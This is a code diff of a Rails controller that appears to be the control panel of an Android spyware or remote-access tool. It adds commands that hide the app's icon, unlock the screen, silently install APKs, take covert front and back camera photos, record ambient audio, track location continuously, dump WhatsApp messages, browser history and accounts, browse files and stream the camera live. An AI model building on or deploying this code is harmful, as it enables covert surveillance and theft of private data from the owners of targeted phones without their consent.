@@ -1,5 +1,5 @@
 class SmartphonesController < InheritedResources::Base
-  include CommandSender
+  before_action :authenticate_admin_user!
   # Thread-safe recording state managed via Smartphone.is_recording column
 
   def dump_sysinfo
@@ -65,29 +65,21 @@ class SmartphonesController < InheritedResources::Base
   def dump_wifi_info
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
-      pending_command = send_command_and_wait(@smartphone, 'get_wifi_info', {}, timeout: 15.seconds)
-      
-      if pending_command.completed?
-        wifi_data = pending_command.response_data
-        commandOutput = [
-          "SSID: #{wifi_data['ssid']}",
-          "BSSID: #{wifi_data['bssid']}",
-          "IP: #{wifi_data['ip_address']}",
-          "Speed: #{wifi_data['link_speed']} Mbps",
-          "Signal: #{wifi_data['rssi']} dBm",
-          "MAC: #{wifi_data['mac_address']}"
-        ]
-      else
-        error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
-        commandOutput = ["Operation Failed: #{error_msg}"]
-      end
-      
+
+      # Send async command to get WiFi info
+      pending_command = send_command_async(
+        @smartphone,
+        'get_wifi_info',
+        {}
+      )
+
+      commandOutput = ["WiFi info command sent (Request ID: #{pending_command.request_id})", "Check device for results"]
+
     rescue => e
       Rails.logger.error("Error dumping wifi info: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "dump_wifi_info", locals: { commandOutput: commandOutput }
@@ -98,21 +90,21 @@ class SmartphonesController < InheritedResources::Base
   def dump_localtime
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
-      pending_command = send_command_and_wait(@smartphone, 'get_device_info', {}, timeout: 15.seconds)
-      
-      if pending_command.completed?
-        device_info = pending_command.response_data
-        commandOutput = ["Device Time: #{Time.at(device_info['timestamp'] / 1000).to_s}"]
-      else
-        commandOutput = ["Operation Failed"]
-      end
-      
+
+      # Send async command to get device local time
+      pending_command = send_command_async(
+        @smartphone,
+        'get_localtime',
+        {}
+      )
+
+      commandOutput = ["Local time command sent (Request ID: #{pending_command.request_id})", "Check device for results"]
+
     rescue => e
       Rails.logger.error("Error getting device time: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "dump_localtime", locals: { commandOutput: commandOutput }
@@ -120,28 +112,39 @@ class SmartphonesController < InheritedResources::Base
     end
   end
 
+  # Alias for dump_localtime (RESTful naming)
+  def get_localtime
+    dump_localtime
+  end
+
+  # Alias for dump_wifi_info (RESTful naming)
+  def get_wifi_info
+    dump_wifi_info
+  end
+
   def uninstall_app
     begin
-      app_name = params[:app]
+      app_name = params[:app] || params[:package_name]
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
+
       if app_name.present?
-        pending_command = send_command_and_wait(@smartphone, 'uninstall_app', { package_name: app_name }, timeout: 30.seconds)
-        
-        if pending_command.completed?
-          commandOutput = ["App uninstall initiated: #{app_name}"]
-        else
-          commandOutput = ["Operation Failed"]
-        end
+        # Send async command
+        pending_command = send_command_async(
+          @smartphone,
+          'uninstall_app',
+          { package_name: app_name }
+        )
+
+        commandOutput = ["App uninstall command sent: #{app_name} (Request ID: #{pending_command.request_id})"]
       else
         commandOutput = ["No app name provided"]
       end
-      
+
     rescue => e
       Rails.logger.error("Error uninstalling app: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "uninstall_app",
@@ -180,34 +183,42 @@ class SmartphonesController < InheritedResources::Base
   def install_apk
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      apk_file_param = params[:apk_file]
-      
+      apk_file_param = params[:apk_file] || params[:file_path] || params[:file_url]
+
       if apk_file_param.present?
-        # Read APK file and encode to Base64
-        apk_data = apk_file_param.read
-        apk_base64 = Base64.strict_encode64(apk_data)
-        
-        pending_command = send_command_and_wait(
-          @smartphone, 
-          'install_apk', 
-          { apk_base64: apk_base64 }, 
-          timeout: 60.seconds
-        )
-        
-        if pending_command.completed?
-          commandOutput = ["APK installation started"]
+        # Handle file upload or URL
+        if apk_file_param.is_a?(ActionDispatch::Http::UploadedFile)
+          # Save uploaded file to public/uploads
+          upload_dir = Rails.root.join('public', 'uploads', 'apk')
+          FileUtils.mkdir_p(upload_dir) unless Dir.exist?(upload_dir)
+          
+          filename = SecureRandom.uuid + File.extname(apk_file_param.original_filename)
+          filepath = upload_dir.join(filename)
+          
+          File.write(filepath, apk_file_param.read)
+          apk_path = "/uploads/apk/#{filename}"
         else
-          commandOutput = ["Operation Failed"]
+          # Use provided path or URL
+          apk_path = apk_file_param
         end
+
+        # Send async command with file path/URL
+        pending_command = send_command_async(
+          @smartphone,
+          'install_apk',
+          { apk_path: apk_path }
+        )
+
+        commandOutput = ["APK installation command sent (Request ID: #{pending_command.request_id})"]
       else
-        commandOutput = ["No APK file provided"]
+        commandOutput = ["No APK file or path provided"]
       end
-      
+
     rescue => e
       Rails.logger.error("Error installing APK: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "install_apk", locals: { commandOutput: commandOutput }
@@ -217,26 +228,27 @@ class SmartphonesController < InheritedResources::Base
   
   def run_app
     begin
-      app_name = params[:app]
+      app_name = params[:app] || params[:package_name]
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
+
       if app_name.present?
-        pending_command = send_command_and_wait(@smartphone, 'launch_app', { package_name: app_name }, timeout: 15.seconds)
-        
-        if pending_command.completed?
-          commandOutput = ["App launched: #{app_name}"]
-        else
-          commandOutput = ["Operation Failed"]
-        end
+        # Send async command
+        pending_command = send_command_async(
+          @smartphone,
+          'launch_app',
+          { package_name: app_name }
+        )
+
+        commandOutput = ["App launch command sent: #{app_name} (Request ID: #{pending_command.request_id})"]
       else
         commandOutput = ["No app specified"]
       end
-      
+
     rescue => e
       Rails.logger.error("Error running app: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "run_app", locals: { commandOutput: commandOutput }
@@ -282,20 +294,21 @@ class SmartphonesController < InheritedResources::Base
   def screen_unlock
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
-      pending_command = send_command_and_wait(@smartphone, 'unlock_screen', {}, timeout: 10.seconds)
-      
-      if pending_command.completed?
-        commandOutput = ["Screen unlocked"]
-      else
-        commandOutput = ["Operation Failed"]
-      end
-      
+
+      # Send async command to unlock screen
+      pending_command = send_command_async(
+        @smartphone,
+        'unlock_screen',
+        {}
+      )
+
+      commandOutput = ["Screen unlock command sent (Request ID: #{pending_command.request_id})"]
+
     rescue => e
       Rails.logger.error("Error unlocking screen: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "screen_unlock", locals: { commandOutput: commandOutput }
@@ -306,21 +319,22 @@ class SmartphonesController < InheritedResources::Base
   def hide_app_icon
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
-      pending_command = send_command_and_wait(@smartphone, 'hide_icon', {}, timeout: 10.seconds)
-      
-      if pending_command.completed?
-        @smartphone.update(is_app_hidden: true)
-        commandOutput = ["App icon hidden"]
-      else
-        commandOutput = ["Operation Failed"]
-      end
-      
+
+      # Send async command to hide app icon
+      pending_command = send_command_async(
+        @smartphone,
+        'hide_icon',
+        {}
+      )
+
+      @smartphone.update(is_app_hidden: true)
+      commandOutput = ["App hide command sent (Request ID: #{pending_command.request_id})"]
+
     rescue => e
       Rails.logger.error("Error hiding icon: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "hide_app_icon", locals: { commandOutput: commandOutput }
@@ -331,21 +345,22 @@ class SmartphonesController < InheritedResources::Base
   def show_app_icon
     begin
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
-      pending_command = send_command_and_wait(@smartphone, 'show_icon', {}, timeout: 10.seconds)
-      
-      if pending_command.completed?
-        @smartphone.update(is_app_hidden: false)
-        commandOutput = ["App icon visible"]
-      else
-        commandOutput = ["Operation Failed"]
-      end
-      
+
+      # Send async command to show app icon
+      pending_command = send_command_async(
+        @smartphone,
+        'show_icon',
+        {}
+      )
+
+      @smartphone.update(is_app_hidden: false)
+      commandOutput = ["App show command sent (Request ID: #{pending_command.request_id})"]
+
     rescue => e
       Rails.logger.error("Error showing icon: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "show_app_icon", locals: { commandOutput: commandOutput }
@@ -357,36 +372,28 @@ class SmartphonesController < InheritedResources::Base
     begin
       mode = params[:mode] # 'silent', 'vibrate', 'normal'
       @smartphone = Smartphone.find(params[:smartphone_id])
-      
+
       if mode.present?
-        pending_command = send_command_and_wait(@smartphone, 'change_audio_mode', { mode: mode }, timeout: 10.seconds)
-        
-        if pending_command.completed?
-          commandOutput = ["Audio mode changed to: #{mode}"]
-        else
-          commandOutput = ["Operation Failed"]
-        end
+        # Send async command to change audio mode
+        pending_command = send_command_async(
+          @smartphone,
+          'change_audio_mode',
+          { mode: mode }
+        )
+
+        commandOutput = ["Audio mode change command sent: #{mode} (Request ID: #{pending_command.request_id})"]
       else
         commandOutput = ["No mode specified"]
       end
-      
+
     rescue => e
       Rails.logger.error("Error setting audio mode: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
-    
+
     respond_to do |format|
       format.js {
         render "set_audio_mode", locals: { commandOutput: commandOutput }
-      }
-    end
-  end
-      puts "Error listing apps."
-    end
-    respond_to do |format|
-      format.js {
-        render "list_apps",
-               :locals => { :commandOutput => commandOutput }
       }
     end
   end
@@ -515,15 +522,18 @@ class SmartphonesController < InheritedResources::Base
           apk_data = File.read(normalized_path)
           apk_base64 = Base64.strict_encode64(apk_data)
         
-        pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
+          pending_command = send_command_and_wait(@smartphone, 'install_apk', { apk_base64: apk_base64 }, timeout: 60.seconds)
         
-        if pending_command.completed?
-          commandOutput = ["Installation started"]
+          if pending_command.completed?
+            commandOutput = ["Installation started"]
+          else
+            commandOutput = ["Operation Failed"]
+          end
         else
-          commandOutput = ["Operation Failed"]
+          commandOutput = ["APK file not found: #{app_path}"]
         end
       else
-        commandOutput = ["APK file not found: #{app_path}"]
+        commandOutput = ["No app path specified"]
       end
       
     rescue => e
@@ -534,6 +544,60 @@ class SmartphonesController < InheritedResources::Base
     respond_to do |format|
       format.js {
         render "install_app", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+
+  def get_accounts
+    begin
+      smartphone = Smartphone.find(params[:smartphone_id])
+      
+      # Send command via ActionCable to Android app
+      command_data = {
+        command: "get_accounts",
+        timestamp: Time.now.to_i
+      }
+      
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.device_id}",
+        command_data
+      )
+      
+      commandOutput = ["Get accounts command sent to device #{smartphone.device_id}", "Waiting for response..."]
+    rescue => e
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js {
+        render "get_accounts",
+               :locals => { :commandOutput => commandOutput }
+      }
+    end
+  end
+
+  def toggle_wifi
+    begin
+      smartphone = Smartphone.find(params[:smartphone_id])
+      
+      # Send command via ActionCable to Android app
+      command_data = {
+        command: "toggle_wifi",
+        timestamp: Time.now.to_i
+      }
+      
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.device_id}",
+        command_data
+      )
+      
+      commandOutput = ["Toggle Wi-Fi command sent to device #{smartphone.device_id}", "Waiting for response..."]
+    rescue => e
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js {
+        render "toggle_wifi",
+               :locals => { :commandOutput => commandOutput }
       }
     end
   end
@@ -688,6 +752,244 @@ class SmartphonesController < InheritedResources::Base
     end
   end
 
+  def take_picture
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      camera = params[:back_camera] == "false" ? "1" : "0"
+      
+      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: camera }, timeout: 30.seconds)
+      
+      if pending_command.completed?
+        photo_data = pending_command.response_data
+        if photo_data && photo_data['image_base64'].present?
+          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
+          file_name = "webcam_snap_#{currentTimeFormat}.jpeg"
+          image_bytes = Base64.decode64(photo_data['image_base64'])
+          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
+          FileUtils.mkdir_p(File.dirname(file_path))
+          File.binwrite(file_path, image_bytes)
+          
+          Picture.create!(
+            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
+            filename: file_name,
+            smartphone_id: @smartphone.id
+          )
+          commandOutput = ["Photo captured: #{file_name} (#{image_bytes.size} bytes)"]
+        else
+          commandOutput = ["Operation Failed: No image data received"]
+        end
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
+    rescue => e
+      Rails.logger.error("Error taking picture: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "take_picture", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  def front_camera_snap
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: "1" }, timeout: 30.seconds)
+      
+      if pending_command.completed?
+        photo_data = pending_command.response_data
+        if photo_data && photo_data['image_base64'].present?
+          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
+          file_name = "front_cam_#{currentTimeFormat}.jpeg"
+          image_bytes = Base64.decode64(photo_data['image_base64'])
+          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
+          FileUtils.mkdir_p(File.dirname(file_path))
+          File.binwrite(file_path, image_bytes)
+          
+          Picture.create!(
+            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
+            filename: file_name,
+            smartphone_id: @smartphone.id
+          )
+          commandOutput = ["Front camera photo: #{file_name} (#{image_bytes.size} bytes)"]
+        else
+          commandOutput = ["Operation Failed: No image data received"]
+        end
+      else
+        commandOutput = ["Operation Failed: Device did not respond"]
+      end
+    rescue => e
+      Rails.logger.error("Error taking front camera snap: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "front_camera_snap", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  def check_root
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      # Send command asynchronously via ActionCable
+      pending_command = send_command_async(@smartphone, 'check_root', {})
+      
+      commandOutput = ["Checking root status..."]
+      
+    rescue => e
+      Rails.logger.error("Error checking root: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "check_root", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+
+  def interval_geolocate
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      interval = (params[:interval] || 60).to_i
+      
+      # Send command asynchronously via ActionCable
+      # Device will collect location at regular intervals
+      pending_command = send_command_async(@smartphone, 'start_continuous_location', { interval: interval })
+      
+      commandOutput = ["Location tracking started (interval: #{interval}s)"]
+      
+    rescue => e
+      Rails.logger.error("Error starting interval geolocate: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "interval_geolocate", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+
+  def dump_whatsapp_messages
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      
+      # Send command asynchronously via ActionCable
+      # WhatsAppResponseProcessor will handle saving the messages
+      pending_command = send_command_async(@smartphone, 'dump_whatsapp_messages', {})
+      
+      commandOutput = ["WhatsApp message extraction initiated..."]
+      
+    rescue => e
+      Rails.logger.error("Error dumping WhatsApp messages: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
+    respond_to do |format|
+      format.js {
+        render "dump_whatsapp_messages", locals: { commandOutput: commandOutput }
+      }
+    end
+  end
+
+  def ambient_record
+    begin
+      smartphone_id = params[:smartphone_id]
+      smartphone = Smartphone.find(smartphone_id)
+      duration = (params[:duration] || 60).to_i
+
+      command_data = {
+        command: "ambient_record",
+        duration: duration,
+        timestamp: Time.now.to_i
+      }
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        command_data
+      )
+      commandOutput = ["🌙 Ambient recording started (#{duration}s) on #{smartphone.name}"]
+    rescue => e
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "ambient_record", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  def browse_files
+    begin
+      smartphone = Smartphone.find(params[:smartphone_id])
+      path = params[:path] || "/sdcard"
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        { command: "browse_files", params: { path: path }, timestamp: Time.now.to_i }
+      )
+      commandOutput = ["📂 Browsing #{path} on #{smartphone.name}"]
+    rescue => e
+      commandOutput = ["Error: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "browse_files", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  def get_app_usage
+    begin
+      smartphone = Smartphone.find(params[:smartphone_id])
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        { command: "get_app_usage", timestamp: Time.now.to_i }
+      )
+      commandOutput = ["📊 Collecting app usage from #{smartphone.name}"]
+    rescue => e
+      commandOutput = ["Error: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "get_app_usage", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  def get_browser_history
+    begin
+      smartphone = Smartphone.find(params[:smartphone_id])
+      ActionCable.server.broadcast(
+        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        { command: "get_browser_history", timestamp: Time.now.to_i }
+      )
+      commandOutput = ["🌐 Collecting browser history from #{smartphone.name}"]
+    rescue => e
+      commandOutput = ["Error: #{e.message}"]
+    end
+    respond_to do |format|
+      format.js { render "get_browser_history", locals: { commandOutput: commandOutput } }
+    end
+  end
+
+  # WebRTC Live Streaming
+  def start_webrtc_stream
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      stream_type = params[:stream_type] || 'camera'
+
+      # Send async command to device to start WebRTC streaming
+      pending_command = send_command_async(
+        @smartphone,
+        'start_webrtc_stream',
+        { stream_type: stream_type }
+      )
+
+      commandOutput = ["🎥 WebRTC stream initiated (#{stream_type})"]
+    rescue => e
+      Rails.logger.error("Error starting WebRTC stream: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+
+    respond_to do |format|
+      format.js { render "start_webrtc_stream", locals: { commandOutput: commandOutput } }
+    end
+  end
+
   private
 
   def smartphone_params
@@ -703,6 +1005,18 @@ class SmartphonesController < InheritedResources::Base
                                        :sms_messages,
                                        :geo_locations,
                                        :is_app_hidden)
+  end
+  
+  def command_service_for(smartphone)
+    DeviceCommandService.new(smartphone)
+  end
+
+  def send_command_async(smartphone, command, params = {})
+    command_service_for(smartphone).queue_command(command, params)
+  end
+
+  def send_command_and_wait(smartphone, command, params = {}, timeout: 30.seconds)
+    command_service_for(smartphone).wait_for_command(command, params, timeout: timeout)
   end
   
   # Helper method to send commands via ActionCable to Android device
